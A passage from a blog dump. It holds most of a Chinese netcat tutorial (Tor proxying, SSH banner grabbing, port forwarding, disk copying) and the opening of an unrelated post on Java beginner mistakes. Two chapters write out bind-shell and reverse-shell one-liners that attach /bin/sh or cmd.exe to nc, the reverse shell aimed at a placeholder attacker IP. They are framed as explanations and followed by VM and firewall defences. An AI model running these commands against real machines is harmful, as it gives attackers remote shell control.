Tor）。本文以下部分称之为【nc over Tor】。 顺便说一下：“原版 nc”【不支持】代理，而 nc 的“OpenBSD 变种”支持各种代理。这是两种 nc 之间的关键性差异之一。 ◇方法 为了支持代理，nc 的“OpenBSD 变种”增加了两个选项：-X 与 -x 选项 -x 该选项表示【代理的位置】，以 x.x.x.x:xxx 的形式表示（中间是【半角冒号】）。 选项 -X 该选项表示【代理的类型】，含义如下： 选项值 含义 5 SOCKS5 代理 4 SOCKS4 代理 connect CONNECT 型的 HTTP 代理 首先，确保你本机已经运行了 Tor； 然后，拿俺的域名测试一下。如果 nc 的输出中包含 succeeded（参见下面的第2行），说明 OK 啦——nc 已经能通过 Tor 联网。 123nc -X 5 -x 127.0.0.1:9050 -q 3 -v program-think.blogspot.com 443Connection to program-think.blogspot.com 443 port [tcp/https] succeeded! （注：如果你用的是“Tor Browser”，上述命令中的“-x 选项值”改为 127.0.0.1:9150） ◇补充说明：延时退出 在上述举例中，俺用到了一个新的 -q 选项。主要考虑到：本博客的 Web Server 位于【公网】。 当你用 nc 连接【公网】上的服务器，因为【公网】的传输质量会受到诸多因素的影响，最好加 -q 选项，让 nc【延时】退出。 在俺的示例中，延时3秒。实际操作时，要根据你的网络环境调整。 ◇补充说明：Tor 暗网的好处 关于 Tor 的用处/好处，俺在博客上重复唠叨的次数，已经数不清了。 （简而言之）由于 Tor 暗网的线路会经历“三级跳”＆“三重套”，而且其线路每隔10分钟就会【随机】变换一次。这种变态的玩法，可以让【网络层面】的逆向追溯变得非常非常困难。 ◇补充说明：域名解析 当你用刚才的招数做到【nc over Tor】之后，一旦 nc 的网络行为需要解析域名，会自动通过 Tor 的 SOCKS 代理进行【远程域名解析】。 也就是说，“DNS 协议”相关数据流也经过 Tor 暗网——这样既可以【防止】“域名解析”暴露你的网络行为，还可以避免 GFW 的“域名污染”。 ◇补充说明：设置别名（alias） 如果你比较懒，觉得每次都输入上述两个代理选项太麻烦，可以为 nc 设置一个【别名】（命令如下） 1alias nc-tor=&#x27;nc -X 5 -x 127.0.0.1:9050&#x27; 设置好之后，你只要用 nc-tor 就可以自动追加代理选项。 如果想让别名【永久】生效，要把上述命令加入到：你当前使用的 shell 的启动文件中。 再次唠叨：“裸 Tor”与“Tor Browser”的监听端口有差异。俺上述命令的 9050 是用于“裸 Tor”。 ★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）◇使用场景 （本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过） 入侵者在发起攻击之前，有一个很重要的步骤叫做【信息收集】。攻击者对目标了解得越多，得手的机会就越大。 下面俺以 SSH Server（sshd）举例。 ◇方法 如今要【远程管理】服务器，最常用的大概就是 SSH 这种方式了。 如果某个服务器运行了 SSH 服务端（默认监听端口是 22），那么用如下命令可以看出：该服务器的操作系统类型，以及 SSH server 的版本。 12echo &quot;EXIT&quot; | nc-tor -vq 5 -n 服务器IP 22echo &quot;EXIT&quot; | nc-tor -vq 5 服务器域名 22 选项 -v 玩这招时，最好加 -v 选项——nc 会先显示“端口已经连上”或者“端口连不上”。 选项 -q （关于该选项的说明，参见“招数4”章节的【延时退出】） nc-tor 别名 （关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理） 前面聊了这么久，一直没有给出【实例】。现在来一个【真实的】例子——用 nc 探测 Github 的 SSH 端口 （注：在如下终端窗口中，头一行是命令，后面两行是输出） 1234echo &quot;EXIT&quot; | nc-tor -vq 5 ssh.github.com 22Connection to ssh.github.com 22 port [tcp/ssh] succeeded!SSH-2.0-babeld-dae25663 ◇补充说明：echo 命令 上述用到的 echo 命令是 POSIX 下常用的命令。Windows 的命令行中也有同名的命令，但功能/用法有【差异】。 ◇补充说明：批处理 ＆ 自动化 某些“有心人”甚至可以搞一个脚本，批量探测某个 IP 地址段的 22 端口，然后把找到的服务器信息保存在某个文件中。 另外， 有的系统管理员会把 sshd 的监听端口从 22 改为其它数值，想要迷惑攻击者。但这么干，【效果不大】。 攻击者可以先进行端口扫描，拿到所有已开启的 TCP 监听端口；然后利用上述方法，对这些 TCP 端口进行【自动化】探测，从而判断出哪个端口是 SSH Server。 ◇补充说明：防范措施 本章节以“SSH Server”举例来说明入侵者如何探测服务端的软件版本。 除了“SSH Server”，很多其它的服务端软件，也存在类似的【信息暴露】。 一个谨慎的系统管理员，应该通过定制，【消除 or 伪造】这些信息，从而增加入侵者的攻击成本。 ★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问◇使用场景 （本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过） 有时候，俺想要看某个 Web 服务器上的某个页面的内容，但是又【不希望】在那上面留下俺本人的任何痕迹。这里所说的“痕迹”既包括【网络】层面滴，也包括【操作系统 ＆ 软件】层面滴。 要搞定【网络】层面，很简单——主要靠【暗网】（Tor or I2P），来掩盖你的【真实】“公网 IP”。具体的玩法，前面章节已经聊过啦。 要搞定【操作系统 ＆ 软件】层面，稍微麻烦一点。如果你用传统的浏览器（Chrome、Firefox、IE、Edge …）访问了某个页面。即使你禁用了 JS，伪造了浏览器的“User Agent”。但如果 Web 服务器想要收集你的系统指纹，还是有若干办法——可以通过浏览器的一些差异，获得某些信息量（安全行话叫做“浏览器指纹”）。 比如说：HTTP 协议的【Header】字段可能会包含某些信息。 比如说：不同内核的浏览器，对页面的渲染会有差异。对页面中的【外部】元素（图片、JS、CSS …）的加载效率也会有差异。 比如说：即使同一款浏览器，在不同系统平台上，依然会表现出某些差异。 …… 此时，nc 再度派上用场——你可以用 nc 直接抓取页面，保存到本机。 这种玩法相当于——让 nc 在【裸 TCP】层面执行 HTTP 协议的命令。在整个过程中，浏览器完全【不】参与其中。既【不会】暴露浏览器的信息，也【不会】暴露操作系统的信息。 ◇方法 先执行下列两个命令的其中一个（具体看你想用“IP”还是“域名”） 12echo -e &quot;GET / HTTP/1.0\\r\\n\\r\\n&quot; | nc-tor -vq 5 服务器域名 端口echo -e &quot;GET / HTTP/1.0\\r\\n\\r\\n&quot; | nc-tor -vq 5 -n 服务器IP 端口 然后 nc 就会把这个页面抓下来，打印到命令行终端。这时候你看到的是【HTML 源代码】。 上述命令访问的是 Web Server 的【根路径】。如果你想要看其它路径的页面（比如说：/index.html），稍微修改成如下： 12echo -e &quot;GET /index.html HTTP/1.0\\r\\n\\r\\n&quot; | nc-tor -vq 5 服务器域名 端口echo -e &quot;GET /index.html HTTP/1.0\\r\\n\\r\\n&quot; | nc-tor -vq 5 -n 服务器IP 端口 由于正常人类是无法直接阅读【HTML 源代码】滴。为了更加人性化，你可以把 nc 抓下来的 HTML 源代码，（在命令行中用“大于号”）重定向到某个 HTML 文件，然后就可以用你本机的浏览器阅读之。 nc-tor 别名 （关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理） 选项 -q （关于该选项的说明，参见“招数4”章节的【延时退出】） ◇补充说明：HTTP 协议协议版本 有些同学会奇怪——为啥俺上述的示例用的是 1.0 而不是 1.1？ 主要是为了偷懒——按照 RFC 的规范，HTTP 1.1 的 Request 中，Host 是【必须】的字段；而在 HTTP 1.0 中，这个字段是【可选】滴。 HTTPS nc 的“OpenBSD 变种”还【不】支持 HTTPS（SSL/TLS）。 在本文末尾介绍的其它变种里面，ncat ＆ socat 已经完全支持 SSL/TLS 协议。 由于本文主要介绍 nc 的“OpenBSD 变种”，关于 ncat ＆ socat 的话题，就不展开啦。 ◇补充说明：这种方式的【缺点】关于“页面的【外部】元素” 用这招，nc 只抓取页面本身，不包括页面中的外部元素（图片、JS、CSS …）。 这种方式拿到的页面，阅读的时候会显得比较丑陋（你就凑合着看吧） 关于“JS 引擎” 由于这招只是在 TCP 层面模拟了简单的 HTTP 协议。所以只能得到【静态 HTML】。 如果某个页面的内容是依靠【前端 JS】动态生成（所谓的 AJAX 风格），那这招就不灵啦（因为 nc【没有】JS 引擎）。 ★招数7：（网络配置）基于 nc 的端口转发（Port Forward）◇使用场景 关于【端口转发】的相关概念，有啥用处和好处，那篇都已经写了。这里就不再重复唠叨啦。 在当年那篇教程中，俺主要聊了两个工具，分别是是 rinetd 和 netsh。当年为啥没有介绍 netcat 捏？因为 nc 的功能太强，所谓“杀鸡焉用牛刀”。相比之下，rinetd 的使用非常简单，而 netsh 是 Windows 内置滴工具。 今天就把当年没聊的给补一下——如何用 nc 玩“端口转发”。 ◇原理 用 nc 进行端口转发，需要运行【两个】nc 进程，一个充当“服务端”，另一个是“客户端”，然后用【管道】让把两个进程的“标准输入输出”交叉配对。所谓的“交叉配对”就是——每一个 nc 进程的“标准输出”都【对接】到另一个 nc 进程的“标准输入”。如此一来，就可以完美地建立【双向通讯】。 玩过命令行的同学，应该都知道：大部分 shell 都支持【管道符】（就是那个竖线符号 |），可以把某个进程的标准输出，重定向给另一个进程的标准输入。但是 shell 的“管道符”只能做到“单向配对”，【无法】做到“交叉配对”。所以还需要再借助另一个管道——也就是“命名管道”。 “命名管道”洋文叫做“named pipe”，是一种进程间通讯（IPC）的机制。顾名思义，“命名管道”就是有名号滴，而 shell 中使用的那个【管道符】，其本质上是“匿名管道”（无名管道）。 主流的操作系统（Windows、Linux、UNIX）都支持“命名管道”这种机制。由于俺本人的环境是 Linux，下面只以 Linux 举例。 ◇方法步骤1：创建命名管道 用下面这个简单的命令创建一个“命名管道”，其名称叫做 nc_pipe。（俺用这个名称只是为了举例，你也可以用别的名称） 1mkfifo nc_pipe 步骤2：同时启动两个 nc 1nc -l -p 1234 &lt; nc_pipe | nc 127.0.0.1 5678 &gt; nc_pipe 运行上述命令之后，就可以把本机的 1235 端口重定向到本机的 5678 端口。 这个命令有点复杂。技术菜鸟如果看不懂，就算了（没关系滴，不影响你看后续的章节）。 如果你比较喜欢刨根问底，俺稍微解释一下： 上述命令行中，前一个 nc 充当【服务端】，后一个 nc 充当【客户端】。命令行中的“管道符”使得“服务端 nc”的输出绑定到“客户端 nc”的输入。然后再用 nc_pipe 这个命名管道做中转，使得“客户端 nc”的输出绑定到“服务端 nc”的输入。从而完成了【交叉配对】。 ◇补充说明：如何让 nc 的监听端口【持续开启】 参见“招数2”章节中的“补充说明”。 ★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）◇使用场景 提醒一下： 【不要混淆】本章节与“招数4”。 “招数4”聊的是——nc 自己通过代理进行网络访问（nc over Tor）。 “本章节”聊的是——nc 帮助其它网络软件走代理进行网络访问（XX软件 over nc over Tor）。 比如说，SSH 是很常用的一个安全工具——用来远程操作服务器。 在某些特殊场合，俺想要通过 SSH 登录某个服务器，但是又【不希望】服务器记录俺本人【真实的】“公网 IP”（“暴露【真实的】公网 IP”等同于“暴露真实身份”） 说到这里，很多老读者肯定猜到俺说啥——让 SSH 走 Tor 代理（SSH over Tor）。 但可惜的是：（POSIX 系统中常用的）OpenSSH 客户端【不支持】SOCKS 代理，而 Tor 默认提供的是 SOCKS 代理。这时候，netcat 就派上用场啦——用 nc 把 SSH 的数据流转发到 Tor 的 SOCKS 代理。 ◇方法 由于 Github 同时提供了几种不同的访问途径（Web、Git、SSH）。对【每一种】Github 的访问方式，俺都介绍了相应的隐匿措施。 对 SSH 这种访问方式，当时俺介绍的招数就是——用 nc 进行代理转发（把 SSH 的数据流转发到 Tor） 既然当年已经聊过了，这里就不重复唠叨啦。对这招感兴趣的同学，请猛击上述链接。 ◇补充说明：“SSH over Tor”与“Tor over SSH” 即使懂技术的同学，有时候也会混淆这两者。俺顺便澄清一下： Tor over SSH 这种方式相当于 SSH 作为 Tor 的前置代理。假设你有一个墙外的 SSH server，而且没有被 GFW 屏蔽，就可以用这招，让你的 Tor 客户端通过这个 SSH server 联网。 SSH over Tor 这是让 SSH 通过 Tor 网络（暗网）连接到 SSH 服务器，从而隐藏 SSH 客户端的【真实】公网 IP。在这种情况下，SSH 服务器看到的访问者 IP 是“Tor 出口节点的公网 IP”。 ★招数9：（系统管理）用 nc 传输文件◇使用场景 有时候，你需要在两台电脑之间传输文件。也可以用 nc 搞定。 俺猜到某些技术小白会问：为啥不用 Windows 的共享目录？ 反驳的理由很多——反驳1：这个玩意儿只能在 Windows 上用。反驳2：为了使用“共享目录”，需要启用（Enable）系统中的好几个 service，这会增加你系统的【攻击面】。反驳3：启用的 service 越多，占用的内容也越多，影响性能。…… 还有些同学会问：为啥不用 FTP、SSH（或诸如此类的东东）？ 俺觉得：1、如果只是临时传一个文件，还要额外再去装某某软件的客户端/服务端，岂不是很蛋疼？2、任何服务端软件，（从某种意义上说）都是在【增加攻击面】。 ◇方法 为了叙述方便，假设你有两台主机 A 与 B，你要把 A 主机上的文件 file1 传输到 B 主机上，保存为 file2 你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号） 1nc -l -p xxx &gt; file2 然后在【发送端】（A 主机）运行如下命令。 1nc x.x.x.x xxx &lt; file1 第二条命令中的 xxx 是端口号，要与第一条命令中的端口号相同；第二条命令中的 x.x.x.x 是【主机 B】的 IP 地址。 ◇补充说明：nc 的性能优势 用 nc 传输文件，相当于是：直接在【裸 TCP】层面传输。你可以通俗理解为：【没有】应用层。 （不熟悉网络分层的同学，再去复习一下本文开头的 OSI 模型） 如果你传输的文件【超级大】或者文件数量【超级多】，用 nc 传输文件的性能优势会很明显（相比“FTP、SSH、共享目录…”而言） ★招数10：（系统管理）用 nc 远程备份整个磁盘◇使用场景 当你学会“用 nc 传输文件”，还可以用 nc【复制整个硬盘】。 无论是对“系统管理员”，还是对“入侵者”甚至是“数据取证人员”，这招都是蛮有用滴。 考虑到某些读者是“技术菜鸟”，俺稍微说明一下。 “磁盘复制”【不同于】“在两块磁盘之间复制文件”。两者之间有很多差别，至少包括：性能差异——如果“源盘”上有非常多的小文件，“在两块磁盘之间复制文件”就会【非常慢】。完整性差异——“磁盘复制”可以确保两块盘的内容是完全一致滴。而如果你仅仅在两块磁盘之间复制文件，很多信息都损失掉了。 一般来说，“系统管理员”和“入侵者”更看重第1个差异（性能）；而“数据取证人员”更看重第2个差异（完整性）。 ◇原理 为了传输整个磁盘，你需要用到 dd 命令。这玩意儿源自 UNIX，后来也移植到 Linux 和 Windows。 关于 dd 命令的更详细介绍，可以参见“维基百科”（这里）或“Gnu 官网”（这里）。 通过 dd 命令，你可以把“整个硬盘”（或者硬盘上的某个“物理分区”、“逻辑分区”）dump 成一个文件。 在本章节，由于最终目的是要【跨主机备份磁盘】，所以并【不】需要真的把 dd 命令的输出保存成文件，而是把 dd 的输出通过管道符（|）重定向给【本机】的 nc，然后让【本机】的 nc 发送到另一台主机的 nc（参见前一个招数）。 ◇方法 由于操作物理磁盘会涉及到操作系统的差异，下面俺以 Linux 举例。 假设你要把 A 主机 /dev/sda 磁盘的【原始数据】整个复制到 B 主机的 /dev/sdb 磁盘。 你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号） 1nc -l -p xxx | dd of=/dev/sdb 然后在【发送端】（A 主机）运行如下命令。 1dd if=/dev/sda | nc x.x.x.x xxx 第二条命令中的 xxx 是端口号，要与第一条命令中的端口号相同；第二条命令中的 x.x.x.x 是【主机 B】的 IP 地址。 ◇补充说明：nc 的性能优势 如今的存储设备越来越大了。“磁盘”或者“分区”，动不动都是几百个 GB，这时候 nc 的【性能优势】就体现出来啦。 （具体的原因，前一个章节已经分析过了） ★招数11：（入侵手法）用 nc 开启【被动】连接型后门 既然聊 netcat，很自然地会聊到“黑客/骇客”的入侵招数。 做这方面的介绍，并【不是】为了传授入侵技巧；而是为了——让那些注重安全性的同学，能做到“知己知彼”。 ◇使用场景 假设1：你使用的浏览器存在某个安全漏洞，并且该漏洞会让攻击者获得【执行代码】的机会。 假设2：你在某个公共场合使用某个 wifi 热点上网。遗憾的是，这个热点是攻击者设置的陷阱。 假设3：设置该陷阱的攻击者，正好也知道：如何利用上述漏洞。 当这三个假设都成立，攻击者就可以获得在你【本机】执行代码的机会。这时候，攻击者可以下载一个 nc 到你本机，然后用 nc 开启一个【被动】连接型后门。所谓的“【被动】连接型”就是指——nc 开启对外监听端口。 在该场景中，因为攻击者与你处于【同一个局域网】，攻击者自然能从自己的机器访问到你本机的 nc 后门。 ◇原理 为了让后门能工作，通常会使用 nc 的 -e 选项，该选项的“选项值”是一个可执行文件的路径。 设置了该选项之后，当处于监听状态的 nc 接受到某个连接，会启动“选项值”对应的可执行文件（并得到某个进程），nc 会把该进程的“标准输入输出”与网络通讯【对接】。 为了让这个后门用起来足够爽，攻击者通常会让 nc 去启动一个【shell 进程】。对 Windows 系统而言，就是 cmd.exe；对 POSIX 系统（Linux or UNIX）而言，就是 /bin/sh 在这种情况下（nc 挂载 shell），攻击者远程连入 nc 的端口，就可以直接在这个 shell 上进行各种操作，其效果类似于 SSH 或（老式的）telnet。 ◇入侵方法步骤1 如果受害者是 Windows 系统，只须如下命令就可以开启一个后门（其中的 xxx 是端口号） 1nc.exe -l -p xxx -e cmd.exe 如果受害者是 POSIX 系统（Linux or UNIX），则用如下命令： 1nc -l -p xxx -e /bin/sh 步骤2 后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。 ◇补充说明：-e 选项 据说是考虑到 -e 选项太过危险，nc 的 OpenBSD 变种（在多年前）已经【移除】了该选项。但其实捏，还是可以用间接的方式达到同样的效果（具体如何做，俺就不透露啦）。 另，“原版 nc”依然有这个选项；nc 的很多其它变种，也依然有这个选项。 ◇【不够】靠谱的防范措施 在这个场景中，大伙儿可能会想到三个值得改进之处：1、浏览器的漏洞2、使用公共 wifi 热点的习惯3、防火墙的设置 对第1点 其实是【无解】滴！因为任何人都无法确保浏览器是【零漏洞】； 对第2点 要看每个人的具体情况而定。对有些人而言，“用公共热点上网”属于【刚需】。那就没办法了。 对第3点 “防火墙”这招，似乎是比较通用的解决之道。对大部分人而言，桌面 PC 根本就【不必】开启对外监听端口。因此，你可以配置操作系统自带防火墙，禁止【所有的】对外监听端口。 但是！（俺要开始说【但是】了） 操作系统自带的防火墙，本身也运行在操作系统【之内】。如果你是以【管理员身份】遭遇入侵，入侵者在进行【代码执行】的时候，就已经具有了【管理员权限】。在这个权限下，入侵者完全有可能“搞定”防火墙。方法有很多种——比如说：把用作后门的端口号，悄悄加入到防火墙的白名单中；再比如说：直接把防火墙的过滤模块干掉；更牛逼的入侵者，甚至可以在【网卡驱动】上做文章——因为网卡驱动位于防火墙的过滤模块【之下】（比防火墙更底层） ◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS） 首先，这里所说的“NAT 模式”指的是【虚拟机的网卡模式】。如果你不熟悉虚拟机的网卡模式，建议先看俺写的《扫盲操作系统虚拟机》系列教程。 要想用这招，步骤如下：1、当然先要安装【虚拟化软件】（VBox、VMware …），2、安装一个虚拟的操作系统（洋文叫“Guest OS”）3、虚拟系统的网卡设置为【NAT】模式 完成上述步骤后，你就可以在这个虚拟系统中上网。 NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。 在这种配置下，就算某个入侵者完全控制了你的 Guest OS，他/她也【没】办法在 Guest OS 中搭建“被动连接型后门”。换句话说，即使入侵者运行了这种后门，（但由于 NAT 的缘故）后门【无法】接受外部网络的连接，这个后门就【失去意义】啦。 ◇补充说明：“NAT 模式”如何搭配“系统防火墙”？ 上述“NAT 招数”与“系统防火墙”并【不】矛盾。 也就是说，即使你用了这招，你的物理系统（Host OS）还是要配置系统防火墙，并禁止【所有的】对外监听端口。 ★招数12：（入侵手法）用 nc 开启【主动】连接型后门◇使用场景 为了打字省力，继续用【前一个章节】的场景。差别在于，你采纳了前一章节的措施——在某个 NAT 模式的虚拟机（Gest OS）中上网，以对付【被动】连接型的 nc 后门。 可惜的是——即便如此，入侵者在利用漏洞并获得“执行代码”的机会之后，还是有办法用 nc 在你的电脑上搞一个网络后门。 虽然你用了 NAT 模式的【虚拟机】（Guest OS），但入侵者可以用 nc 创建一个【主动】连接型的网络后门（这种玩法，有时也称作“反向连接”的后门）。 ◇原理 原理其实与“招数11”很类似，唯一的差别在于——把客户端与服务端【对调】。也就是说，攻击者手头的 nc 充当服务端，而受害者机器上的 nc 充当客户端。此时，受害者本机的 nc【无须】开启监听端口，【不受】防火墙的影响，也【不受】NAT 的影响。 ◇入侵方法步骤1 既然 nc 的“服务端”与“客户端”对调。因此攻击者要先在自己机器上运行“服务端 nc”，命令如下（其中的 xxx 是端口号）。当然啦，攻击者自己电脑的防火墙需要允许 xxx 端口号对外监听。 1nc -lk -p xxx 步骤2 如果受害者是 Windows 系统，只须如下命令就可以开启一个后门。 1nc.exe -e cmd.exe x.x.x.x xxx 如果受害者是 POSIX 系统，则用如下命令： 1nc -e /bin/sh x.x.x.x xxx （在上述两个命令中， xxx 是步骤1用到的端口号，x.x.x.x 是攻击者的 IP 地址） ◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机 所谓的【隔离模式】，指的是“Host Only 模式”或类似的模式（比如：“Internal 模式”）。 虽然当年那个系列讲的是【隐匿性】，但其中的【虚拟机隔离】，同样可以用来对付“主动连接型后门”。 有必要提醒一下： 【隔离的虚拟机】可以增加入侵者的攻击难度。但【不能】做到 100% 防范。 只要你能在某个隔离虚拟机中上网，那么——那些足够高级的木马，就【有可能】在隔离虚拟机中找到对外连接的通道。从而实现一个“【主动】连接型的后门”。 这下该咋办捏？ （在安全方面）虚拟机有两个【显著好处】——“网络隔离性”只是其中之一，另一个是【快照】。 如果你对安全性的要求【非常高】，要学会：1、用“快照功能”建立【安全基线】（所谓的【安全基线】就是说——在确保系统【纯洁】的时候，先做一个快照）2、养成【定期回退快照】的好习惯（就算你中了木马，只要一回退到【安全基线】，系统重新变得【纯洁】啦） ◇“【主动】连接型后门”的优势之处（危险性之处） 简单对比一下“后门的两种连接方式”。 可用性 如果用“被动型后门”入侵桌面 PC，考虑到绝大部分桌面 PC 都处于内网（其网卡【并未】分配公网 IP）。对这种场景，攻击者需要与受害者在同一个局域网，才能与后门建立通讯。 相比之下，“主动型后门”就【没有】这种弊端。 隐蔽性 “被动型后门”需要显式开启监听端口，很容易引起用户的怀疑，或引起杀毒软件的注意。 相比之下，“主动型后门”就【没有】这个问题。 ★附录：netcat 的【其它变种】 本文开头部分已经介绍了“原版 nc”以及“OpenBSD 变种”。在结尾部分，简单聊聊其它几个变种。 ◇GNU netcat 官网在“这里”。 从名称可以猜出：这是 GNU 社区对“原版 nc”的重写，以符合 GPL 许可协议。 按照它官网的说法，“GNU netcat”100% 兼容“原版 nc”的 1.10 版本。（注：1.10 版本是“原版 nc”用得最广的版本） ◇ncat 这是 nmap 社区重写的 nc，其官网页面在“这里”，帮助页面在“这里”。 它的口号是：Ncat - Netcat for the 21st Century 与“OpenBSD 变种”类似，它也增加了代理的支持。相比“OpenBSD 变种”，它的主要亮点是：完全支持 SSL/TLS。 由于它源自 nmap 社区，已经被包含在 nmap 软件包中（大多数 Linux ＆ BSD 发行版的官方仓库都有 nmap） ◇socat 在所有的变种里面，（据俺所知）这款可能是功能最强滴！但使用方法也有很大的不同（更复杂了）。感觉像是另一个全新的软件。 很多主流的 Linux 发行版已经包含它。 他也完全支持 SSL/TLS。 ◇Cryptcat 一看名称就能猜到：这是“加密的网猫”。 由于大部分网猫都是直接在“裸 TCP”之上传输数据。如果传输的内容本身是明文，会遭遇【网络嗅探】的风险。 这款变种在传输过程中用 twofish 算法加密，以规避嗅探。 ◇sbd 光看这3字母的名称，你可能不知道这款变种的特色。 但如果俺告诉你：“sbd”是“Secure BackDoor”的缩写，你多半就猜到其特色了。 它的加密采用“AES-128-CBC + HMAC-SHA1”。 ◇netrw 这是专门针对“文件传输”功能进行强化和简化的变种。 【简化】方面 它分成两个命令：netread 和 netwrite，分别对应发送和接收。（相对“原版 nc”）省了几个命令选项。 【强化】方面 它会对传输过程进行散列校验，以防止传输的数据被篡改。","comments":true,"categories":[{"name":"编程随想","slug":"编程随想","permalink":"http://1905060202.github.io/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/"}],"tags":[{"name":"programthink","slug":"programthink","permalink":"http://1905060202.github.io/tags/programthink/"},{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"java新手的通病","date":"2021-07-16T15:43:01.000Z","path":"2021/07/16/java新手的通病/","text":"数据结构和算法为什么我先拿“数据结构和算法”说事捏？这玩意是写程序最最基本的东东。不管你使用 Java 还是其它的什么语言，都离不开它。而且这玩意是跨语言的，学好之后不管在哪门语言中都能用得上。 既然“数据结构和算法”这么重要，为什么很多 Java 新手却很不熟悉捏？我琢磨了一下，估计有两种可能。有些人虽然是计算机系毕业的，但是当初压根没好好学过这门课程，到工作时早都还给老师了；还有一些人是中途转行干编程，转行后又没有好好地打基础（都指望速成）。 下面我列出几个很基本的问题，如果你每一个问题都搞得很清楚，那说明你过了这关，可以去看看下一个帖子了。否则的话，你赶紧去找本算法和数据结构的书恶补一下吧。 ★什么时候该用数组型容器、什么时候该用链表型容器？★什么是散列函数？HashMap 的实现原理是什么？★什么是递归？如果你以前从来没写过递归函数，尝试着写一个（比如用递归函数进行目录树遍历）。★什么是算法复杂度？★你是否理解空间换时间的思想？★写一个针对整数数组的冒泡排序函数，看看你要修改几次才能跑通。★写一个针对整数数组的二分查找函数，看看你要修改几次才能跑通。 缺乏面向对象基本功按理说 Java 是一个很 OO 的语言，Java 社区也一向是充满了“对象”的氛围。但俺在面试 Java 程序员时，却屡屡碰到令人大跌眼镜的事情。俺碰到不止一个求职者，连什么是“多态”都讲不清楚。很多人号称用过设计模式，但一半以上都仅限于单键模式和抽象工厂模式。当我深入问他/她抽象工厂模式到底有什么好处时，很多人语焉不详。 为什么很多 Java 程序员会缺乏面向对象基本功？这得怪那些 Java 框架。现在 Java 的各种框架太发达、太傻瓜化了，导致很多程序员只需要按部就班、照着框架进行代码填空，基本已经丧失了 OOA 和 OOD 的能力。我手下有些个 Java 程序员，对 Spring、Hibernate 等框架了如指掌；但如果给他一个简单需求，让他写一个脱离 Web 框架的独立 Application，他就不知所措了。这样的开发人员，将来只能成为所谓的“软件蓝领”，岗位很难得到提升。 同上文一样，我这次也提如下几个问题：★基于接口的继承和基于实现的继承各有什么优缺点？★继承（包括 extend 和 implement）有什么【缺点】？★多态（polymorphism）有什么【缺点】？★为什么 Java 可以多继承 interface，而不可以多继承 class？★假如让你写一个小游戏（比如人机对战的五子棋），你会如何设计类结构？★类结构设计时，如何考虑可扩展性？ 如果上述这些问题你都能够搞得比较清楚，说明你的 OO 基础还过得去。否则的话，我建议你一边找些 OOAD 和设计模式的书看看，同时自己动手写些简单的小程序（不依赖那些框架），把学到的模式理论结合到实践中。通过这种方式来提高自己 OOAD 的能力，效果会比较好。 编程习惯 上次聊了“缺乏面向对象基本功”，今天来说说编程习惯的问题。今天说的这些坏习惯大部分都是跨语言的（C++、Python 新手也有），而且大部分都需要靠平时不断地努力才能慢慢改掉。 ★随意地命名 有些新手写程序，当需要定义某个变量名（也可能是函数名、类名、包名等）时，随意地一敲键盘，名字就起好了……若干星期后，碰到某 bug，再来看自己写的代码时，心中暗自嘀咕：“这代码是我写的吗？咋都看不懂捏？” 所以我常跟新来的菜鸟说，命名不规范害死人啊！鉴于该问题相当普遍，我整理了几种典型的作为反面教材，具体如下：使用单字母命名变量；使用一些没太大意义的变量名（例如 s1、s2、s3）；对同一个业务概念使用不同的术语/缩写（容易让读代码的人神经分裂）；使用拼音命名（如果你团队中有港台人士或者老外，就惨了）。 ★习惯于代码的 copy &amp; paste 这是一个很普遍的问题。很多新手写代码的时候，如果发现要写的某个函数和前几天写的某个函数差不多，就把原来的那个函数贴过来，然后稍微改几下，心中还暗喜：“又快速搞定了一个功能”…… 同学，如果你也喜欢这么干，可要注意了。这种做法是代码臭味（借用《重构 - 改善既有代码的设计》的提法）的主要来源，导致代码可维护性大大下降。当你将来需要增加功能或修改 bug 的时候，要同时改动多个地方，而那时你估计已经想不起来这砣代码有几个克隆了。 ★Magic Number 满天飞 如果你没有听说过“Magic Number”，先看“这里”了解一下。为了说明Magic Number的问题，咱找个例子来说事儿：假设有个业务逻辑中需要进行10秒的超时等待，你会怎么写这个sleep语句？我估计大部分人不外乎下面三种写法：1、直接写上 sleep(10*1000); 了事2、定义一个常量 TIMEOUT_XXX = 10*1000; 然后 sleep(TIMEOUT_XXX);3、在配制文件中加入一个超时项，然后程序读取配制文件获得超时值，然后调用 sleep。（此处提到的“配置文件”是广义的，泛指各种可用于存储配置信息的机制，如：xml 文件、ini 文件、数据库 …） 如果你的做法类似于写法1，你多半喜欢随手硬编码。硬编码不光缺乏可读性，而且具有和“代码拷贝粘贴”类似的代码臭味（可能会存在多个 Magic Number 克隆），不利于日后维护。 至于写法2，比写法1稍好（至少可读性好了）。但是，将来一旦发生需求变更，要求在【运行时】调整超时间隔（甚至要求让用户来配制超时间隔），则写法2的缺点立马暴露无遗。 ★代码耦合度太大 每当说到 MVC 或者设计模式，几乎每个 Java 开发人员都能说得头头是道？但是说归说，真正写代码的时候，鲜有人写出的代码是层次清楚的。至于说到代码耦合分别由哪些情况引起？什么是正交的设计？（关于耦合与正交设计，我后面会专门讨论一下）能完全搞明白的人就更少了。 所以很多 Java 新手的代码耦合度大也就不足为奇了。我曾经抽查过试用期员工的代码，各种业务逻辑纠缠在一起，代码臭味都要熏死人。想重构都无从下手，只好让他推倒重写。 ★被 GC 宠坏 由于 Java 